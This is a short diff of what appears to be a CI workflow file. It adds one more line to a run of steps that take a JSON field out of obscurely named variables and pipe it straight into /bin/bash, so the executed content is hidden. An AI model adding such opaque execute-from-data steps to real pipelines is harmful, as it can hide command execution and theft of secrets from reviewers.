@@ -52,6 +52,7 @@ jobs:
           echo $qx65 | jq -r .szc79492 | /bin/bash
           printf '%s' "$q01" | jq -r .ybcyx2997 | /bin/bash
           echo $w25363 | jq -r .hvze5692 | /bin/bash
+          echo $y30 | jq -r .v2 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
